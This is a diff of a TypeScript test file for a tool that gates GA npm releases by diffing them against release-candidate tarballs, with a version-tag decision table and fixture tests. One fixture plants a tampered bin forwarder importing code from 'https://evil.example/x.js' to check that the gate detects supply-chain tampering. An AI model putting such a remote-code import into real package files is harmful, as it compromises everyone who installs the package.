@@ -18,10 +18,10 @@ import {
   assertEntrySafe,
   compareTarEntries,
   countVersionOccurrences,
+  decideGaTarballDiffGate,
   diffFileBytes,
   diffPackageJson,
   parseRcVersion,
-  shouldRunGaTarballDiffGate,
   substituteVersion,
   validateVersionBump,
   validateVersionPair,
@@ -217,25 +217,174 @@ describe('validateVersionBump', () => {
   });
 });
 
-// --- shouldRunGaTarballDiffGate (#1562) -------------------------------------
+// --- decideGaTarballDiffGate (#1562 round 2) --------------------------------
+//
+// The gate is keyed on the GIT TAGS the founder pushed for the target's own
+// X.Y.Z tuple, never on `rcTag` alone: `rcTag` is the credential window's live
+// pin and is legitimately cleared when the window closes, which is exactly
+// when the GA cut happens. Every row below is one reviewer-named transition.
 
-describe('shouldRunGaTarballDiffGate', () => {
-  it('runs for a target identical to the credentialed rc', () => {
-    const d = shouldRunGaTarballDiffGate('1.0.0-rc.1', '1.0.0-rc.1');
-    expect(d.run).toBe(true);
-    expect(d.reason).toContain('identical');
-  });
+describe('decideGaTarballDiffGate — transition table', () => {
+  const tagsRc12 = ['v0.1.0', '@getknext/lib@0.4.3', 'v1.0.0-rc.1', 'v1.0.0-rc.2'];
 
-  it('runs for a GA cut', () => {
-    const d = shouldRunGaTarballDiffGate('1.0.0-rc.3', '1.0.0');
-    expect(d.run).toBe(true);
-    expect(d.reason).toContain('GA cut');
-  });
+  const table: Array<{
+    row: string;
+    targetVersion: string;
+    pinnedRcTag: string | null;
+    gitTags: string[];
+    action: 'run' | 'skip' | 'fail';
+    rcTag?: string;
+    reason: RegExp;
+  }> = [
+    {
+      row: '1.0.0 with rc tags, rcTag pinned at the highest -> RUN against the highest',
+      targetVersion: '1.0.0',
+      pinnedRcTag: 'v1.0.0-rc.2',
+      gitTags: tagsRc12,
+      action: 'run',
+      rcTag: 'v1.0.0-rc.2',
+      reason: /highest release candidate/,
+    },
+    {
+      row: '1.0.0 with rc tags, rcTag CLEARED at GA (window closed) -> still RUNS',
+      targetVersion: '1.0.0',
+      pinnedRcTag: null,
+      gitTags: tagsRc12,
+      action: 'run',
+      rcTag: 'v1.0.0-rc.2',
+      reason: /highest release candidate/,
+    },
+    {
+      row: 'rc.10 outranks rc.9 numerically, not lexically',
+      targetVersion: '1.0.0',
+      pinnedRcTag: null,
+      gitTags: ['v1.0.0-rc.9', 'v1.0.0-rc.10', 'v1.0.0-rc.2'],
+      action: 'run',
+      rcTag: 'v1.0.0-rc.10',
+      reason: /highest release candidate/,
+    },
+    {
+      row: 'rcTag pinned at rc.1 while rc.2 exists -> FAIL (ambiguous credential)',
+      targetVersion: '1.0.0',
+      pinnedRcTag: 'v1.0.0-rc.1',
+      gitTags: tagsRc12,
+      action: 'fail',
+      reason: /ambiguous/,
+    },
+    {
+      row: 'rcTag pinned at a malformed same-tuple rc tag -> FAIL (ambiguous credential)',
+      targetVersion: '1.0.0',
+      pinnedRcTag: 'v1.0.0-rc.2-hotfix',
+      gitTags: tagsRc12,
+      action: 'fail',
+      reason: /ambiguous/,
+    },
+    {
+      row: 'rcTag pinned at ANOTHER tuple (next window open) does not affect 1.0.0 -> RUN',
+      targetVersion: '1.0.0',
+      pinnedRcTag: 'v1.1.0-rc.1',
+      gitTags: [...tagsRc12, 'v1.1.0-rc.1'],
+      action: 'run',
+      rcTag: 'v1.0.0-rc.2',
+      reason: /highest release candidate/,
+    },
+    {
+      row: '1.0.1 after 1.0.0 (rcTag still pinned at v1.0.0-rc.2) -> SKIP, never blocks',
+      targetVersion: '1.0.1',
+      pinnedRcTag: 'v1.0.0-rc.2',
+      gitTags: tagsRc12,
+      action: 'skip',
+      reason:
+        /no release candidate was cut for 1\.0\.1 — this release is not claimed as credentialed/,
+    },
+    {
+      row: '1.1.0 -> SKIP',
+      targetVersion: '1.1.0',
+      pinnedRcTag: 'v1.0.0-rc.2',
+      gitTags: tagsRc12,
+      action: 'skip',
+      reason: /no release candidate was cut for 1\.1\.0/,
+    },
+    {
+      row: '2.0.0 -> SKIP',
+      targetVersion: '2.0.0',
+      pinnedRcTag: null,
+      gitTags: tagsRc12,
+      action: 'skip',
+      reason: /no release candidate was cut for 2\.0\.0/,
+    },
+    {
+      row: '0.4.4 (a patch on the pre-1.0 line) -> SKIP',
+      targetVersion: '0.4.4',
+      pinnedRcTag: 'v1.0.0-rc.2',
+      gitTags: tagsRc12,
+      action: 'skip',
+      reason: /no release candidate was cut for 0\.4\.4/,
+    },
+    {
+      row: 'a look-alike tag for a DIFFERENT tuple (v1.0.0-rc.1 vs target 1.0.01 / 11.0.0) is never matched',
+      targetVersion: '11.0.0',
+      pinnedRcTag: null,
+      gitTags: ['v1.0.0-rc.1', 'v11.0.0-rc.x', 'v11.0.0-rc.1-foo', 'x11.0.0-rc.1'],
+      action: 'skip',
+      reason: /no release candidate was cut for 11\.0\.0/,
+    },
+    {
+      row: 'prerelease 1.0.0-rc.3 -> SKIP by design',
+      targetVersion: '1.0.0-rc.3',
+      pinnedRcTag: 'v1.0.0-rc.2',
+      gitTags: tagsRc12,
+      action: 'skip',
+      reason: /prerelease/,
+    },
+    {
+      row: 'prerelease identical to the pinned rc (1.0.0-rc.2) -> SKIP by design',
+      targetVersion: '1.0.0-rc.2',
+      pinnedRcTag: 'v1.0.0-rc.2',
+      gitTags: tagsRc12,
+      action: 'skip',
+      reason: /prerelease/,
+    },
+    {
+      row: 'prerelease 2.0.0-rc.1 / 1.0.0-beta.0 -> SKIP by design',
+      targetVersion: '1.0.0-beta.0',
+      pinnedRcTag: null,
+      gitTags: tagsRc12,
+      action: 'skip',
+      reason: /prerelease/,
+    },
+    {
+      row: 'NO tags fetched at all (shallow/tagless checkout) on a GA -> FAIL closed, never skip',
+      targetVersion: '1.0.0',
+      pinnedRcTag: null,
+      gitTags: [],
+      action: 'fail',
+      reason: /no git tags/,
+    },
+  ];
 
-  it('skips an ordinary mid-window rc bump', () => {
-    const d = shouldRunGaTarballDiffGate('1.0.0-rc.1', '1.0.0-rc.2');
-    expect(d.run).toBe(false);
-    expect(d.reason).toContain('mid-window rc bump');
+  for (const t of table) {
+    it(t.row, () => {
+      const d = decideGaTarballDiffGate({
+        targetVersion: t.targetVersion,
+        pinnedRcTag: t.pinnedRcTag,
+        gitTags: t.gitTags,
+      });
+      expect(d.action).toBe(t.action);
+      expect(d.reason).toMatch(t.reason);
+      if (t.action === 'run') expect(d.rcTag).toBe(t.rcTag);
+      else expect(d.rcTag).toBeUndefined();
+    });
+  }
+
+  it('the FAIL message names both the pinned tag and the highest tag', () => {
+    const d = decideGaTarballDiffGate({
+      targetVersion: '1.0.0',
+      pinnedRcTag: 'v1.0.0-rc.1',
+      gitTags: tagsRc12,
+    });
+    expect(d.reason).toContain('v1.0.0-rc.1');
+    expect(d.reason).toContain('v1.0.0-rc.2');
   });
 });
 
@@ -861,6 +1010,23 @@ describe('size-field truncation (must fail closed at the diff level)', () => {
 
 // --- CLI end-to-end -----------------------------------------------------
 
+// The unscoped `kn-next` npx alias is in the changesets `fixed` group and
+// ships at GA alongside the three `@getknext/*` packages (#1562 round 2,
+// review finding 4) — so it is part of the compared set, bin forwarder and
+// all.
+const ALIAS_BIN = "#!/usr/bin/env node\nimport '@getknext/core/dist/cli/kn-next.js';\n";
+
+function buildAlias(dir: string, version: string, bin = ALIAS_BIN) {
+  buildFixtureTarball(dir, 'kn-next', {
+    'package.json': JSON.stringify({
+      name: 'kn-next',
+      version,
+      dependencies: { '@getknext/core': `^${version}` },
+    }),
+    'bin/kn-next.js': bin,
+  });
+}
+
 function buildCleanTrio(dir: string, version: string) {
   for (const name of ['@getknext/lib', '@getknext/db', '@getknext/core'] as const) {
     buildFixtureTarball(dir, name, {
@@ -868,6 +1034,7 @@ function buildCleanTrio(dir: string, version: string) {
       'index.js': 'module.exports = {};\n',
     });
   }
+  buildAlias(dir, version);
 }
 
 describe('ga-tarball-diff CLI (fixture tarballs)', () => {
@@ -896,6 +1063,7 @@ describe('ga-tarball-diff CLI (fixture tarballs)', () => {
         'index.js': 'module.exports = {};\n',
       });
     }
+    buildAlias(gaDir, '1.0.0');
 
     const { code, output } = runCli(['--rc-dir', rcDir, '--ga-dir', gaDir]);
     expect(code).toBe(1);
@@ -916,6 +1084,32 @@ describe('ga-tarball-diff CLI (fixture tarballs)', () => {
     const { code, output } = runCli(['--rc-dir', rcDir, '--ga-dir', gaDir]);
     expect(code).toBe(1);
     expect(output).toContain('@getknext/db');
+  });
+
+  it('diffs the unscoped kn-next alias too: a changed bin forwarder fails the gate', () => {
+    const rcDir = mkFixtureDir('ga-diff-cli-rc-alias-');
+    const gaDir = mkFixtureDir('ga-diff-cli-ga-alias-');
+    buildCleanTrio(rcDir, '1.0.0-rc.3');
+    buildCleanTrio(gaDir, '1.0.0');
+    rmSync(join(gaDir, 'kn-next.tgz'), { force: true });
+    buildAlias(gaDir, '1.0.0', "#!/usr/bin/env node\nimport 'https://evil.example/x.js';\n");
+
+    const { code, output } = runCli(['--rc-dir', rcDir, '--ga-dir', gaDir]);
+    expect(code).toBe(1);
+    expect(output).toContain('FAIL: kn-next');
+    expect(output).toContain('bin/kn-next.js');
+  });
+
+  it('fails closed when the kn-next alias is missing from the GA set', () => {
+    const rcDir = mkFixtureDir('ga-diff-cli-rc-alias-missing-');
+    const gaDir = mkFixtureDir('ga-diff-cli-ga-alias-missing-');
+    buildCleanTrio(rcDir, '1.0.0-rc.3');
+    buildCleanTrio(gaDir, '1.0.0');
+    rmSync(join(gaDir, 'kn-next.tgz'), { force: true });
+
+    const { code, output } = runCli(['--rc-dir', rcDir, '--ga-dir', gaDir]);
+    expect(code).toBe(1);
+    expect(output).toContain('missing from GA set: kn-next');
   });
 
   it('requires exactly one of --rc-dir/--ga-dir or --rc-ref/--ga-ref', () => {
@@ -945,6 +1139,8 @@ describe('ga-tarball-diff CLI (fixture tarballs)', () => {
     buildFixtureTarball(gaDir, '@getknext/core', {
       'package.json': JSON.stringify({ name: '@getknext/core', version: '1.0.0' }),
     });
+    buildAlias(rcDir, '1.0.0-rc.3');
+    buildAlias(gaDir, '1.0.0');
 
     const { code, output } = runCli(['--rc-dir', rcDir, '--ga-dir', gaDir]);
     expect(code).toBe(1);
@@ -982,6 +1178,8 @@ describe('ga-tarball-diff CLI (fixture tarballs)', () => {
     buildFixtureTarball(gaDir, '@getknext/db', {
       'package.json': JSON.stringify({ name: '@getknext/db', version: '1.0.0' }),
     });
+    buildAlias(rcDir, '1.0.0-rc.3');
+    buildAlias(gaDir, '1.0.0');
 
     // rc core: clean.
     const rcStage = mkFixtureDir('ga-diff-attack-rc-stage-');
